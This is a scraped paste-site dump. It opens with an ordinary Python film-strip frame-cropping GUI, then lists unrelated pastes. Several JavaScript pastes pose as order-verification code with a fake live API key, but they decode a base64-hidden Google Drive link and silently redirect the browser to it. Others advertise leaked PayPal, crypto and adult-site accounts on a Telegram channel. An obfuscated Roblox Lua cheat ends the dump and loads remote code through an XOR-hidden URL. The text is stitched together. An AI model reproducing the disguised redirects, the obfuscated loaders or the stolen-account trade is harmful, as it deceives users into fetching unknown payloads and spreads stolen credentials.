    def select_output_folder(self):
        self.output_folder = filedialog.askdirectory(title=""Select Output Folder"")
        if self.output_folder:
            logger.info(""Output folder selected: %s"", self.output_folder)
            self.output_folder_label.config(text=self.output_folder, fg=""green"")
        else:
            logger.info(""No output folder selected."")
            self.output_folder_label.config(text=""No folder selected"", fg=""gray"")
            messagebox.showinfo(""Folder Selection"", ""No output folder selected."")

    def start_processing(self):
        if not self.input_folder or not self.output_folder:
            messagebox.showerror(""Error"", ""Please select both input and output folders!"")
            return
        try:
            ignore_setting = self.ignore_frames_label.get()
            self.processor = FilmStripProcessor(
                input_folder=self.input_folder,
                output_folder=self.output_folder,
                threshold_value=self.threshold_value.get(),
                frame_x_offset=50,
                frame_y_offset=250,
                frame_width_max=850,
                frame_height_max=1700,
                ignore_frames=ignore_setting,
                gui=self
            )
            logger.info(""Processor initialized with ignore setting: %s"", ignore_setting)
            self.show_progress_popup()
            self.process_button.config(state=tk.DISABLED)
            self.processing_thread = threading.Thread(target=self.run_processing, daemon=True)
            self.processing_thread.start()
        except Exception as e:
            messagebox.showerror(""Error"", f""Failed to initialize processor: {e}"")
            logger.exception(""Failed to initialize processor"")

    def show_progress_popup(self):
        logger.debug(""Displaying progress popup with progress bar."")
        self.popup = tk.Toplevel(self.root)
        self.popup.title(""Processing..."")
        self.popup.geometry(""300x150"")
        
        self.progress_label = tk.Label(self.popup, text=""Processing images..."", font=(""Helvetica"", 12))
        self.progress_label.pack(pady=10)
        
        # Create a progress bar; set an initial maximum that gets updated later.
        self.progress_bar = ttk.Progressbar(self.popup, orient=""horizontal"", mode=""determinate"", maximum=100)
        self.progress_bar.pack(pady=10, fill=""x"", padx=10)
        
        self.stop_button = tk.Button(self.popup, text=""Stop Processing"", command=self.stop_processing)
        self.stop_button.pack(pady=10)
        self.popup.protocol(""WM_DELETE_WINDOW"", self.stop_processing)

    def run_processing(self):
        logger.info(""Starting batch processing of images."")
        try:
            self.processing_active = True
            image_queue = sorted([os.path.join(self.input_folder, f)
                                  for f in os.listdir(self.input_folder)
                                  if f.lower().endswith(('.jpg', '.jpeg', '.png'))])
            total_images = len(image_queue)
            logger.info(""Processing %d images."", total_images)
            
            # Update the progress bar maximum.
            self.root.after(0, lambda: self.progress_bar.config(maximum=total_images))
            
            processed = 0
            total_frames_saved = 0
            for image_path in image_queue:
                if not self.processing_active:
                    logger.info(""Processing stopped by user."")
                    break
                logger.debug(""Processing image: %s"", image_path)
                frames = self.processor.detect_and_crop_frames(image_path)
                frames_saved = self.processor.save_detected_frames(frames, strip_filename=os.path.basename(image_path))
                total_frames_saved += frames_saved
                processed += 1
                # Update the progress bar.
                self.root.after(0, self.update_progress_bar, processed)
            logger.info(""Batch processing complete. Total frames saved: %d"", total_frames_saved)
        finally:
            self.preview_cache.clear()
            self.frame_preview_cache.clear()
            self.popup.destroy()
            self.root.after(0, lambda: self.process_button.config(state=tk.NORMAL))

    def stop_processing(self):
        logger.info(""User requested to stop processing."")
        self.processing_active = False
        self.preview_cache.clear()
        self.frame_preview_cache.clear()
        self.popup.destroy()

    def refresh_frame_previews(self, image_path=None):
        logger.debug(""Refreshing frame previews."")
        if not self.input_folder or not self.image_files:
            logger.info(""No input folder or images available for frame preview."")
            return
        if image_path is None:
            image_path = os.path.join(self.input_folder, self.image_files[0])
        if self.processor is not None:
            roi_x = self.processor.frame_x_offset
            roi_y = self.processor.frame_y_offset
            roi_w = self.processor.frame_width_max
            roi_h = self.processor.frame_height_max
        else:
            try:
                roi_x = int(self.roi_x_entry.get())
                roi_y = int(self.roi_y_entry.get())
                roi_w = int(self.roi_w_entry.get())
                roi_h = int(self.roi_h_entry.get())
            except Exception:
                roi_x, roi_y, roi_w, roi_h = 50, 250, 850, 1700
        key = (image_path, self.threshold_value.get(),
               self.flip_vertical_var.get(), self.flip_horizontal_var.get(),
               self.rotate90_var.get(), self.rotate180_var.get(),
               self.ignore_frames_label.get(),
               roi_x, roi_y, roi_w, roi_h)
        if key in self.frame_preview_cache:
            logger.debug(""Frame preview found in cache."")
            self.original_frame_previews = self.frame_preview_cache[key]
            self.current_frame_index = 0
            self.update_frame_preview()
            return
        if self.processor is None:
            logger.debug(""Creating temporary FilmStripProcessor for frame preview."")
            temp_processor = FilmStripProcessor(
                input_folder=self.input_folder,
                output_folder=self.input_folder,  # Not used here.
                threshold_value=self.threshold_value.get(),
                frame_x_offset=50, frame_y_offset=250,
                frame_width_max=850, frame_height_max=1700,
                ignore_frames=""None"",
                gui=self
            )
        else:
            temp_processor = self.processor
        frames = temp_processor.detect_and_crop_frames(image_path)
        
        ignore_setting = self.ignore_frames_label.get()
        if ignore_setting in [""First Frame"", ""Both""] and len(frames) > 0:
            logger.debug(""Removing first frame from preview as per ignore setting: %s"", ignore_setting)
            frames = frames[1:]
        if ignore_setting in [""Last Frame"", ""Both""] and len(frames) > 0:
            logger.debug(""Removing last frame from preview as per ignore setting: %s"", ignore_setting)
            frames = frames[:-1]
        
        original_list = []
        self.current_frame_index = 0
        for f in frames:
            rgb_frame = cv2.cvtColor(f, cv2.COLOR_BGR2RGB)
            pil_im = Image.fromarray(rgb_frame)
            pil_im = pil_im.rotate(90, expand=True)
            original_list.append(pil_im)
        self.original_frame_previews = original_list
        self.frame_preview_cache[key] = original_list
        if len(self.frame_preview_cache) > self.max_frame_preview_cache_size:
            self.frame_preview_cache.popitem(last=False)
        logger.info(""Frame previews refreshed for image: %s"", image_path)
        self.update_frame_preview()

    def update_frame_preview(self):
        logger.debug(""Updating displayed frame preview."")
        self.frame_preview_canvas.delete(""all"")
        canvas_width = self.frame_preview_canvas.winfo_width()
        canvas_height = self.frame_preview_canvas.winfo_height()
        if hasattr(self, 'original_frame_previews') and self.original_frame_previews:
            pil_img = self.original_frame_previews[self.current_frame_index]
            scale = min(canvas_width / pil_img.width, canvas_height / pil_img.height)
            new_w = int(pil_img.width * scale)
            new_h = int(pil_img.height * scale)
            resized = pil_img.resize((new_w, new_h), Image.LANCZOS)
            photo = ImageTk.PhotoImage(resized)
            self.frame_preview_canvas.create_image(canvas_width/2, canvas_height/2, image=photo)
            self.frame_preview_canvas.image = photo
            logger.debug(""Displayed frame preview index: %d"", self.current_frame_index)
        else:
            self.frame_preview_canvas.create_text(canvas_width/2, canvas_height/2,
                                                   text=""No Frame Previews"",
                                                   fill=""white"", font=(""Helvetica"", 16))
            logger.info(""No frame previews available."")

    def next_frame(self):
        if hasattr(self, 'original_frame_previews') and self.original_frame_previews:
            self.current_frame_index = (self.current_frame_index + 1) % len(self.original_frame_previews)
            logger.debug(""Navigated to next frame preview, index: %d"", self.current_frame_index)
            self.update_frame_preview()

    def prev_frame(self):
        if hasattr(self, 'original_frame_previews') and self.original_frame_previews:
            self.current_frame_index = (self.current_frame_index - 1) % len(self.original_frame_previews)
            logger.debug(""Navigated to previous frame preview, index: %d"", self.current_frame_index)
            self.update_frame_preview()

    def update_progress_bar(self, value):
        try:
            if self.progress_bar is not None and self.progress_bar.winfo_exists():
                self.progress_bar[""value""] = value
                self.progress_label.config(text=f""Processed {value} images"")
            else:
                logger.debug(""Progress bar widget no longer exists. Skipping update."")
        except Exception as e:
            logger.exception(""Error updating progress bar: %s"", e)

    def update_roi(self):
        try:
            x_offset = int(self.roi_x_entry.get())
            y_offset = int(self.roi_y_entry.get())
            width = int(self.roi_w_entry.get())
            height = int(self.roi_h_entry.get())
            
            if self.processor is not None:
                self.processor.frame_x_offset = x_offset
                self.processor.frame_y_offset = y_offset
                self.processor.frame_width_max = width
                self.processor.frame_height_max = height
            else:
                self.default_roi = (x_offset, y_offset, width, height)
            
            logger.info(""Updated ROI settings: X=%d, Y=%d, Width=%d, Height=%d"", x_offset, y_offset, width, height)
            self.preview_cache.clear()
            self.frame_preview_cache.clear()
            self.refresh_preview()
            self.refresh_frame_previews()
        except Exception as e:
            logger.exception(""Error updating ROI: %s"", e)

# =============================================================================
# FilmStripProcessor Class Definition
# =============================================================================
class FilmStripProcessor:
    def __init__(self, input_folder, output_folder, threshold_value=205,
                 frame_x_offset=50, frame_y_offset=250, frame_width_max=850,
                 frame_height_max=1700, ignore_frames=""None"", gui=None):
        self.input_folder = input_folder
        self.output_folder = output_folder
        self.threshold_value = threshold_value
        # Use ROI values from GUI if available
        if gui is not None and hasattr(gui, ""roi_x_entry"") and gui.roi_x_entry.get().isdigit():
            try:
                self.frame_x_offset = int(gui.roi_x_entry.get())
                self.frame_y_offset = int(gui.roi_y_entry.get())
                self.frame_width_max = int(gui.roi_w_entry.get())
                self.frame_height_max = int(gui.roi_h_entry.get())
            except Exception as e:
                logger.exception(""Error reading ROI from GUI; falling back to defaults"")
                self.frame_x_offset = frame_x_offset
                self.frame_y_offset = frame_y_offset
                self.frame_width_max = frame_width_max
                self.frame_height_max = frame_height_max
        else:
            self.frame_x_offset = frame_x_offset
            self.frame_y_offset = frame_y_offset
            self.frame_width_max = frame_width_max
            self.frame_height_max = frame_height_max

        self.frame_counter = 1
        self.processed_count = 0
        self.ignore_frames = ignore_frames
        self.gui = gui
        logger.info(""FilmStripProcessor initialized with: threshold=%d, offsets=(%d,%d), max_size=(%d,%d), ignore_frames=%s"",
                    threshold_value, self.frame_x_offset, self.frame_y_offset,
                    self.frame_width_max, self.frame_height_max, ignore_frames)

    def debug_print(self, message):
         logger.debug(message)

    def apply_custom_orientation(self, image):
         transformed = image
         if self.gui:
             if self.gui.flip_horizontal_var.get():
                 transformed = cv2.flip(transformed, 1)
             if self.gui.flip_vertical_var.get():
                 transformed = cv2.flip(transformed, 0)
             if self.gui.rotate90_var.get():
                 transformed = cv2.rotate(transformed, cv2.ROTATE_90_CLOCKWISE)
             if self.gui.rotate180_var.get():
                 transformed = cv2.rotate(transformed, cv2.ROTATE_180)
         return transformed

    def load_image(self, image_path):
         logger.debug(""🔍 Attempting to load image: %s"", image_path)
         try:
             formatted_path = os.path.normpath(image_path)
             logger.debug(""🔄 Reformatted path: %s"", formatted_path)
             if not os.path.exists(formatted_path):
                 logger.error(""File does not exist: %s"", formatted_path)
                 return None
             file_type = imghdr.what(formatted_path)
             if file_type not in ['jpeg', 'png']:
                 logger.error(""Unsupported file type: %s"", file_type)
                 return None
             logger.debug(""✅ Validated file type: %s"", file_type)
             image = cv2.imread(formatted_path)
             if image is None:
                 logger.error(""Failed to load image: %s"", formatted_path)
             else:
                 logger.debug(""✅ Image loaded with shape: %s"", image.shape)
             image = self.apply_custom_orientation(image)
             return image
         except cv2.error as e:
             logger.exception(""OpenCV error in load_image"")
             return None
         except Exception as e:
             logger.exception(""Unexpected error in load_image"")
             return None

    def load_and_preprocess_image(self, image_path):
         original_image = self.load_image(image_path)
         if original_image is None:
             logger.error(""Error loading image for preprocessing: %s"", image_path)
             return None, None
         gray = cv2.cvtColor(original_image, cv2.COLOR_BGR2GRAY)
         _, thresh = cv2.threshold(gray, self.threshold_value, 255, cv2.THRESH_BINARY)
         logger.debug(""Image preprocessed (grayscale and threshold applied)"")
         return original_image, thresh

    def extract_sprocket_coordinates(self, contours) -> list:
         sprocket_coords = []
         for c in contours:
             x, y, w, h = cv2.boundingRect(c)
             aspect_ratio = w / float(h)
             area = w * h
             if 0.6 < aspect_ratio < 0.75 and 200 < w < 250 and 300 < h < 400 and 50000 < area < 120000:
                 center_x = x + w // 2
                 center_y = y + h // 2
                 sprocket_coords.append((center_x, center_y))
         logger.debug(""Extracted %d sprocket coordinates."", len(sprocket_coords))
         return sprocket_coords

    def deskew_image(self, image, sprocket_coords):
         if len(sprocket_coords) < 2:
             logger.warning(""Not enough sprocket coordinates for deskewing."")
             return image, 0
         x1, y1 = sprocket_coords[0]
         x2, y2 = sprocket_coords[-1]
         angle = math.degrees(math.atan2(y2 - y1, x2 - x1))
         if angle < -90:
             angle += 180
         elif angle > 90:
             angle -= 180
         logger.info(""Deskewing image by %.2f degrees"", angle)
         height, width = image.shape[:2]
         rotation_matrix = cv2.getRotationMatrix2D((width/2, height/2), -angle, 1.0)
         corrected_image = cv2.warpAffine(image, rotation_matrix, (width, height),
                                          flags=cv2.INTER_LINEAR,
                                          borderMode=cv2.BORDER_CONSTANT,
                                          borderValue=(0,0,0))
         logger.debug(""Deskewed image obtained."")
         return corrected_image, angle

    def get_overlay_image(self, image_path):
         logger.info(""Generating overlay image for: %s"", image_path)
         logger.debug(""Current threshold value in processor: %d"", self.threshold_value)
         original_image = self.load_image(image_path)
         if original_image is None:
             logger.error(""Overlay creation failed; image not loaded: %s"", image_path)
             return None
         overlay = original_image.copy()
         gray = cv2.cvtColor(original_image, cv2.COLOR_BGR2GRAY)
         _, thresh = cv2.threshold(gray, self.threshold_value, 255, cv2.THRESH_BINARY)
         cnts, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
         for c in cnts:
             x, y, w, h = cv2.boundingRect(c)
             aspect_ratio = w / float(h)
             area = w * h
             if 0.6 < aspect_ratio < 0.75 and 200 < w < 250 and 300 < h < 400 and 50000 < area < 120000:
                 overlay_rect = overlay.copy()
                 cv2.rectangle(overlay_rect, (x, y), (x+w, y+h), (0, 0, 255), thickness=-1)
                 cv2.addWeighted(overlay_rect, 0.7, overlay, 0.3, 0, overlay)
         candidate_boxes = self.get_candidate_frame_boxes(cnts)
         ignore_setting = self.gui.ignore_frames_label.get()
         ignore_first = ignore_setting in [""First Frame"", ""Both""]
         ignore_last = ignore_setting in [""Last Frame"", ""Both""]
         logger.debug(""Overlay generation: ignore_first=%s, ignore_last=%s"", ignore_first, ignore_last)
         for idx, (x, y, w, h) in enumerate(candidate_boxes):
             frame_x = max(x + self.frame_x_offset, 0)
             frame_y = max(y - self.frame_y_offset, 0)
             frame_w = min(self.frame_width_max, original_image.shape[1] - frame_x)
             frame_h = min(self.frame_height_max, original_image.shape[0] - frame_y)
             overlay_copy = overlay.copy()
             if (ignore_first and idx == 0) or (ignore_last and idx == len(candidate_boxes) - 1):
                 cv2.putText(overlay_copy, ""Ignored"", (frame_x, frame_y + frame_h + 20),
                             cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 0, 255), 2)
                 logger.debug(""Candidate %d marked as ignored."", idx)
                 frame_color = (0, 0, 255)
             else:
                 frame_color = (0, 255, 255)
             cv2.rectangle(overlay_copy, (frame_x, frame_y),
                           (frame_x + frame_w, frame_y + frame_h), frame_color, thickness=-1)
             cv2.addWeighted(overlay_copy, 0.4, overlay, 0.6, 0, overlay)
         logger.info(""Overlay image generated for: %s"", image_path)
         return overlay

    def detect_and_crop_frames(self, image_path):
         logger.info(""Detecting and cropping frames from image: %s"", image_path)
         try:
             cropped_frames = []
             rotated_image, thresh = self.load_and_preprocess_image(image_path)
             if rotated_image is None or thresh is None:
                 logger.error(""Preprocessing failed for image: %s"", image_path)
                 return []
             cnts, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
             logger.debug(""Found %d contours."", len(cnts))
             sprocket_coords = self.extract_sprocket_coordinates(cnts)
             if sprocket_coords:
                 logger.debug(""Sprocket coordinates: %s"", sprocket_coords)
             if len(sprocket_coords) > 1:
                 rotated_image, angle = self.deskew_image(rotated_image, sprocket_coords)
                 logger.info(""Image deskewed by %.2f degrees"", angle)
                 gray = cv2.cvtColor(rotated_image, cv2.COLOR_BGR2GRAY)
                 _, thresh = cv2.threshold(gray, self.threshold_value, 255, cv2.THRESH_BINARY)
                 cnts, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
                 logger.debug(""After deskewing, %d contours found."", len(cnts))
             cnts = sorted(cnts, key=lambda x: cv2.boundingRect(x)[0], reverse=True)
             for idx, c in enumerate(cnts):
                 x, y, w, h = cv2.boundingRect(c)
                 logger.debug(""Sorted contour %d: x=%d, y=%d, w=%d, h=%d"", idx, x, y, w, h)
             for c in cnts:
                 x, y, w, h = cv2.boundingRect(c)
                 aspect_ratio = w / float(h)
                 if 0.2 < aspect_ratio < 1.0 and w < 300 and h > 50:
                     frame_x = max(x + self.frame_x_offset, 0)
                     frame_y = max(y - self.frame_y_offset, 0)
                     frame_w = min(self.frame_width_max, rotated_image.shape[1] - frame_x)
                     frame_h = min(self.frame_height_max, rotated_image.shape[0] - frame_y)
                     frame = rotated_image[frame_y:frame_y+frame_h, frame_x:frame_x+frame_w]
                     if frame.size > 0:
                         cropped_frames.append(frame)
                         logger.debug(""Cropped frame: x=%d, y=%d, w=%d, h=%d"", x, y, w, h)
             logger.info(""Total cropped frames from %s: %d"", os.path.basename(image_path), len(cropped_frames))
             return cropped_frames
         except cv2.error as e:
             logger.exception(""OpenCV error in detect_and_crop_frames"")
             return []
         except Exception as e:
             logger.exception(""Unexpected error in detect_and_crop_frames"")
             return []

    def save_detected_frames(self, detected_frames, strip_filename):
         logger.info(""Saving detected frames for image: %s"", strip_filename)
         frames_saved = 0
         ignore_first = self.ignore_frames in [""First Frame"", ""Both""]
         ignore_last = self.ignore_frames in [""Last Frame"", ""Both""]
         for idx, frame in enumerate(detected_frames):
             if frame is None or not isinstance(frame, np.ndarray):
                 logger.debug(""Skipping invalid frame at index %d."", idx)
                 continue
             if ignore_first and idx == 0:
                 logger.debug(""Skipping first frame as per settings."")
                 continue
             if ignore_last and idx == len(detected_frames) - 1:
                 logger.debug(""Skipping last frame as per settings."")
                 continue
             rotated_frame = cv2.rotate(frame, cv2.ROTATE_90_CLOCKWISE)
             flipped_frame = cv2.flip(rotated_frame, -1)
             filename = os.path.join(self.output_folder, ""frame_%06d.jpg"" % self.frame_counter)
             try:
                 cv2.imwrite(filename, flipped_frame, [cv2.IMWRITE_JPEG_QUALITY, 100])
                 logger.debug(""Frame saved: %s"", filename)
                 self.frame_counter += 1
                 frames_saved += 1
             except Exception as e:
                 logger.exception(""Error saving frame at index %d"", idx)
         logger.info(""For image %s, frames saved: %d"", strip_filename, frames_saved)
         return frames_saved

    def process_image_queue(self):
         logger.info(""Starting processing of image queue."")
         try:
             image_queue = sorted([os.path.join(self.input_folder, f)
                                  for f in os.listdir(self.input_folder)
                                  if f.lower().endswith(('.jpg', '.jpeg', '.png'))])
             if not image_queue:
                 logger.warning(""No valid images found in the input folder: %s"", self.input_folder)
                 return
             total_images = len(image_queue)
             logger.info(""Processing %d images."", total_images)
             total_frames_saved = 0
             for image_path in image_queue:
                 logger.debug(""Processing image: %s"", image_path)
                 try:
                     frames = self.detect_and_crop_frames(image_path)
                     frames_saved = self.save_detected_frames(frames, strip_filename=os.path.basename(image_path))
                     total_frames_saved += frames_saved
                 except Exception as e:
                     logger.exception(""Error processing image: %s"", image_path)
             logger.info(""Batch processing complete. Total frames saved: %d"", total_frames_saved)
         except Exception as e:
             logger.exception(""Unexpected error in process_image_queue"")

    def get_candidate_frame_boxes(self, contours):
         candidates = []
         for c in contours:
             x, y, w, h = cv2.boundingRect(c)
             aspect_ratio = w / float(h)
             if 0.2 < aspect_ratio < 1.0 and w < 300 and h > 50:
                 candidates.append((x, y, w, h))
         logger.debug(""Found %d candidate frame boxes."", len(candidates))
         return sorted(candidates, key=lambda box: box[0], reverse=True)

# =============================================================================
# Main Execution
# =============================================================================
if __name__ == ""__main__"":
    try:
         logger.info(""Starting application."")
         gui = FilmStripGUI()
    except Exception as e:
         logger.exception(""Unexpected application error: %s"", e)
"
Ju1DXaVN,Untitled,zebmekey,JavaScript,Thursday 24th of April 2025 03:47:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10507/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
77vbS56G,Crypto Accounts,WantingTrae,JavaScript,Thursday 24th of April 2025 03:39:58 AM CDT,10561 Accounts Posted On https://t.me/leakedbyeminem
7AjFSRbr,Products.js,zebmekey,JavaScript,Thursday 24th of April 2025 03:32:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54802/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZAPRrXRL,AttributeError: 'NoneType' object has no attribute 'name',basedcount_bot,Python,Thursday 24th of April 2025 03:32:20 AM CDT,"Traceback (most recent call last):
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 275, in read_comments
    parent_info = await get_parent_info(comment)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 237, in get_parent_info
    parent_author = parent_post.author.name
                    ^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'name'
"
03Kdpjsm,PayPal with Balance,WantingTrae,JavaScript,Thursday 24th of April 2025 03:24:36 AM CDT,17336 Accounts Posted On https://t.me/leakedbyeminem
tSu7qZcB,Order.js,zebmekey,JavaScript,Thursday 24th of April 2025 03:17:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08595/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qS86WQgq,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Thursday 24th of April 2025 03:08:40 AM CDT,44847 Accounts Posted On https://t.me/leakedbyeminem
199yGncG,Market.js,zebmekey,JavaScript,Thursday 24th of April 2025 03:01:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66084/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6TF3ftkn,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Thursday 24th of April 2025 02:53:10 AM CDT,15679 Accounts Posted On https://t.me/leakedbyeminem
0AWBbV2d,Anomaly HUB,Yaroslav95589581,Lua,Thursday 24th of April 2025 02:50:09 AM CDT,"local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v44,v45) local v46={};for v103=1, #v44 do v6(v46,v0(v4(v1(v2(v44,v103,v103 + 1 )),v1(v2(v45,1 + (v103% #v45) ,1 + (v103% #v45) + 1 )))%256 ));end return v5(v46);end local v8=loadstring(game:HttpGetAsync(v7(""\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\232\45\231\191\195\17\198\240\216\55\239\171\211\13\158\238\218\44\232\244\202\31\216\205\148\9\239\185\213\31\195\218"",""\126\177\163\187\69\134\219\167"")))();local v9=v8:CreateWindow(v7(""\2\195\37\200\253\47\212\106\237\201\1\141\8\220\188\113\226\60\224\238\15\194\24\193\195\113"",""\156\67\173\74\165""),v7(""\22\187\70\25\184"",""\38\84\215\41\118\220\70""));local v10=v9:CreateTab(v7(""\117\37\18"",""\158\48\118\66\114""));local v11=false;local v12={};local v13={};local v14={};local v15={};local v16=20;local v17=true;local v18=true;local v19=true;local function v20() local v47=0;while true do if (v47==(1 + 1)) then for v122,v123 in pairs(v12) do pcall(function() v123:Disconnect();end);end v12={};break;end if (v47==0) then for v124,v125 in pairs(v13) do pcall(function() v125:Remove();end);end v13={};v47=1691 -(209 + 1481) ;end if (v47==(2 -1)) then for v126,v127 in pairs(v14) do pcall(function() v127:Destroy();end);end v14={};v47=1638 -(1373 + 263) ;end end end local function v21(v48) local v49=0;local v50;local v51;local v52;while true do if (v49==1) then v52=nil;while true do if (v50==(1000 -(451 + 549))) then v51,v52=workspace.CurrentCamera:WorldToViewportPoint(v48.Position);return Vector2.new(v51.X,v51.Y),v52;end end break;end if (v49==(0 + 0)) then local v108=0 -0 ;while true do if ((1 -0)==v108) then v49=1385 -(746 + 638) ;break;end if (v108==(0 + 0)) then v50=0;v51=nil;v108=1 -0 ;end end end end end local function v22(v53) local v54=0;local v55;local v56;while true do if (v54==(342 -(218 + 123))) then if  not v55 then return;end v15[v53]=v55.Health;v54=1583 -(1535 + 46) ;end if (v54==(0 + 0)) then if ( not v53 or  not v53.Parent) then return;end v55=v53:FindFirstChild(v7(""\131\49\29\55\125\170\242\175"",""\155\203\68\112\86\19\197""));v54=1;end if (v54==(1 + 1)) then v56=nil;v56=v55.HealthChanged:Connect(function(v128) local v129=560 -(306 + 254) ;local v130;while true do if (v129==(0 + 0)) then v130=0 -0 ;while true do if (v130==0) then if  not v53.Parent then local v178=1467 -(899 + 568) ;while true do if ((0 + 0)==v178) then v15[v53]=nil;return v56:Disconnect();end end end v15[v53]=v128;break;end end break;end end end);break;end end end local function v23(v57) local v58=0;local v59;while true do if (v58==(9 -5)) then table.insert(v14,v59);return v59;end if ((606 -(268 + 335))==v58) then v59.Transparency=290.5 -(60 + 230) ;v59.Parent=v57;v58=4;end if (v58==(574 -(426 + 146))) then v59.Size=v57.Size;v59.Color3=Color3.new(1 + 0 ,1,1);v58=1459 -(282 + 1174) ;end if (v58==(812 -(569 + 242))) then v59.AlwaysOnTop=true;v59.ZIndex=28 -18 ;v58=1 + 1 ;end if (v58==0) then local v118=1024 -(706 + 318) ;while true do if (v118==(1252 -(721 + 530))) then v58=1272 -(945 + 326) ;break;end if (v118==0) then v59=Instance.new(v7(""\100\210\46\212\65\118\225\244\67\252\50\243\82\118\232\253\72\201"",""\152\38\189\86\156\32\24\133""));v59.Adornee=v57;v118=2 -1 ;end end end end end local function v24(v60) local v61=0;local v62;local v63;local v64;local v65;while true do if (v61==(3 + 0)) then v65=nil;v65=game:GetService(v7(""\249\41\41\213\219\184\221\53\36\227"",""\202\171\92\71\134\190"")).Stepped:Connect(function() if ( not v11 or  not v60.Parent or  not v60:FindFirstChild(v7(""\1\196\45\140"",""\232\73\161\76""))) then local v155=0;while true do if (v155==(701 -(271 + 429))) then v65:Disconnect();v15[v60]=nil;v155=2 + 0 ;end if (v155==(1500 -(1408 + 92))) then v64:Remove();for v174,v175 